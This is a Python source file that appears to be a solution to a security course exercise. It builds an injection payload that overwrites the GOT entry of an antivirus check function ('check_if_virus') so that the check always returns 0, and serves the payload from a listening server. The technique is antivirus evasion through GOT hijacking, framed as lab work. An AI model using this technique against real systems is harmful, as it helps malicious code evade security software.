import addresses
import evasion
import struct

class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the GOT entry for check_if_virus.

        Reminder: We want to replace it with another function of a similar
        signature, that will return 0.

        Notes:
        1. You can assume we already compiled q3.c into q3.template.
        2. Use addresses.CHECK_IF_VIRUS_GOT, addresses.CHECK_IF_VIRUS_ALTERNATIVE
           (and addresses.address_to_bytes).

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q3.template'

        BYTE_OFFSET = 4
        adr_seq  = b'\x65\x65\x65\x65'
        pid_seq  = b'\x66\x66\x66\x66'
        data_seq = b'\x67\x67\x67\x67'
        
        with open(PATH_TO_TEMPLATE, 'rb') as template:
            code = bytearray(template.read())
       
        pid = bytearray(struct.pack('<i', pid))
        
        for i in range(len(code) - BYTE_OFFSET):
        
            if  code[i:i+BYTE_OFFSET] == adr_seq:
                code[i:i+BYTE_OFFSET] = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_GOT)
                
            elif code[i:i+BYTE_OFFSET] == pid_seq:
                code[i:i+BYTE_OFFSET] = pid
                
            elif code[i:i+BYTE_OFFSET] == data_seq:
                code[i:i+BYTE_OFFSET] = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_ALTERNATIVE)
         
        return bytes(code)

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
